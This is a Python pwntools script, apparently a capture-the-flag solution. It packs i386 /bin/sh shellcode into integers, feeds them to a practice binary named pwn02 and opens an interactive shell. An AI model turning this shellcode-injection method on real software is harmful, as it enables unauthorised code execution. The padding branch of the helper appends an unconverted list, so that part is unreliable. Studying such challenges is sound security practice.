from pwn import *


def shell2int(shellcode):
    def convert(tmp):
        if len(tmp) != 4:
            print('convert error!')
            return 0

        return (tmp[3] << 24) + (tmp[2] << 16) + (tmp[1] << 8) + tmp[0]  # little endian

    print(f'len = {len(shellcode)}')
    i = 0
    tmp_str = []
    res = []
    for ele in shellcode:
        i += 1
        tmp_str.append(ele)
        if i % 4 == 0:
            res.append(convert(tmp_str))
            tmp_str.clear()
    i %= 4
    if i == 0:
        return res
    i = 4 - i
    while i:
        i -= 1
        tmp_str.append(0)
    res.append(tmp_str)
    return res


if __name__ == '__main__':
    addr = './pwn02'
    # shellcode = asm(shellcraft.sh())  # b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    # for ele in shellcode:
    #     print(ele)
    # ints = shell2int(shellcode)
    # for i in ints:
    #     print(i)
    p = process([addr])
    p.recvuntil(b'number\n')
    send_info = [b'0'] * 14 + [b'-16411050', b'1053023492', b'1891764957', b'1145736157', b'2102049027', b'1094696347',
                               b'48393330', b'271564187', b'1338112651', b'-1081205349', b'486646203', b'1267437249', b'79075174']
    print(send_info)
    for ele in send_info:
        p.sendline(ele)
    p.interactive()

